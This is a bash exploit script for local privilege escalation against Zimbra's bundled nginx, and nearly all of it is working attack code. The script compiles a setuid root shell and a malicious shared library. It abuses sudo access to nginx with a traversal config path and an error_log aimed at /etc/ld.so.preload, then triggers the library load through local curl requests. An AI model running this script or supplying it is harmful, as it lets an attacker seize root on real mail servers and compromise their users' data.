#!/bin/bash
echo "~ hinginx.sh - zimbra nginx local privilege escalation ~
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c > /dev/null 2&>1
rm -rf /tmp/libhax.c
cat << EOF > /tmp/defuckulate.sh
#!/bin/bash
killall nginx > /dev/null 2>&1
killall nginx > /dev/null 2>&1
rm -rf /etc/ld.so.preload > /dev/null 2>&1
killall nginx > /dev/null 2>&1
EOF
chmod +x /tmp/defuckulate.sh
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    system("/tmp/defuckulate.sh");
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c > /dev/null 2&>1
rm -f /tmp/rootshell.c
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
error_log /etc/ld.so.preload warn;
events {
        worker_connections 768;
}
http {
server {
	listen 1337;
	root /;
	autoindex on;

}
}
EOF
echo "[+] Run once..."
sudo /opt/zimbra/common/sbin/nginx -c ../../../../../tmp/nginx.conf 
echo "[+] Doing requests..."
curl -s "http://localhost:1337/ /tmp/libhax.so /" > /dev/null 2&>1
curl -s "http://localhost:1337/ /tmp/libhax.so /" > /dev/null 2&>1
echo "[+] Run twice..."
sudo -l > /dev/null 2>&1 
echo "[+] make sure to rm /etc/ld.so.preload and killall nginx a few times..."
/tmp/rootshell
